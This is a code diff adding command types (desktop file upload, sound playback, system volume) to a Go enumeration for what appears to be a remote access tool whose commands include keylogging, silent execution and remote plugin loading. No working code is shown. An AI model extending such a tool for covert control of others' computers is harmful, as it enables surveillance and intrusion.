@@ -153,6 +153,7 @@ const (
 	CommandFileSearch CommandType = "file_search"
 	CommandFileThumb CommandType = "file_thumb"
 	CommandFileUpload CommandType = "file_upload"
+	CommandFileUploadDesktop CommandType = "file_upload_desktop"
 	CommandFileUploadHttp CommandType = "file_upload_http"
 	CommandFileWrite CommandType = "file_write"
 	CommandFileZip CommandType = "file_zip"
@@ -163,6 +164,7 @@ const (
 	CommandKeylogRetrieve CommandType = "keylog_retrieve"
 	CommandMessageBox CommandType = "message_box"
 	CommandOpenUrl CommandType = "open_url"
+	CommandPlaySound CommandType = "play_sound"
 	CommandPluginLoad CommandType = "plugin_load"
 	CommandPluginLoadHttp CommandType = "plugin_load_http"
 	CommandPluginUnload CommandType = "plugin_unload"
@@ -182,6 +184,8 @@ const (
 	CommandScriptExec CommandType = "script_exec"
 	CommandSetWallpaper CommandType = "set_wallpaper"
 	CommandSilentExec CommandType = "silent_exec"
+	CommandStopSound CommandType = "stop_sound"
+	CommandSystemVolume CommandType = "system_volume"
 	CommandUninstall CommandType = "uninstall"
 	CommandVirtualEnableCursor CommandType = "virtual_enable_cursor"
 	CommandVirtualEnableKeyboard CommandType = "virtual_enable_keyboard"
@@ -368,6 +372,7 @@ var CommandTypes = [...]CommandType{
 	CommandFileSearch,
 	CommandFileThumb,
 	CommandFileUpload,
+	CommandFileUploadDesktop,
 	CommandFileUploadHttp,
 	CommandFileWrite,
 	CommandFileZip,
@@ -378,6 +383,7 @@ var CommandTypes = [...]CommandType{
 	CommandKeylogRetrieve,
 	CommandMessageBox,
 	CommandOpenUrl,
+	CommandPlaySound,
 	CommandPluginLoad,
 	CommandPluginLoadHttp,
 	CommandPluginUnload,
@@ -397,6 +403,8 @@ var CommandTypes = [...]CommandType{
 	CommandScriptExec,
 	CommandSetWallpaper,
 	CommandSilentExec,
+	CommandStopSound,
+	CommandSystemVolume,
 	CommandUninstall,
 	CommandVirtualEnableCursor,
 	CommandVirtualEnableKeyboard,
@@ -522,6 +530,7 @@ var CommandVersionSupport = map[CommandType]CommandVersionRange{
 	CommandFileSearch: {Min: 1, Max: 1},
 	CommandFileThumb: {Min: 1, Max: 1},
 	CommandFileUpload: {Min: 1, Max: 1},
+	CommandFileUploadDesktop: {Min: 1, Max: 1},
 	CommandFileUploadHttp: {Min: 1, Max: 1},
 	CommandFileWrite: {Min: 1, Max: 1},
 	CommandFileZip: {Min: 1, Max: 1},
@@ -532,6 +541,7 @@ var CommandVersionSupport = map[CommandType]CommandVersionRange{
 	CommandKeylogRetrieve: {Min: 1, Max: 1},
 	CommandMessageBox: {Min: 1, Max: 1},
 	CommandOpenUrl: {Min: 1, Max: 1},
+	CommandPlaySound: {Min: 1, Max: 1},
 	CommandPluginLoad: {Min: 1, Max: 1},
 	CommandPluginLoadHttp: {Min: 1, Max: 1},
 	CommandPluginUnload: {Min: 1, Max: 1},
@@ -551,6 +561,8 @@ var CommandVersionSupport = map[CommandType]CommandVersionRange{
 	CommandScriptExec: {Min: 1, Max: 1},
 	CommandSetWallpaper: {Min: 1, Max: 1},
 	CommandSilentExec: {Min: 1, Max: 1},
+	CommandStopSound: {Min: 1, Max: 1},
+	CommandSystemVolume: {Min: 1, Max: 1},
 	CommandUninstall: {Min: 1, Max: 1},
 	CommandVirtualEnableCursor: {Min: 1, Max: 1},
 	CommandVirtualEnableKeyboard: {Min: 1, Max: 1},
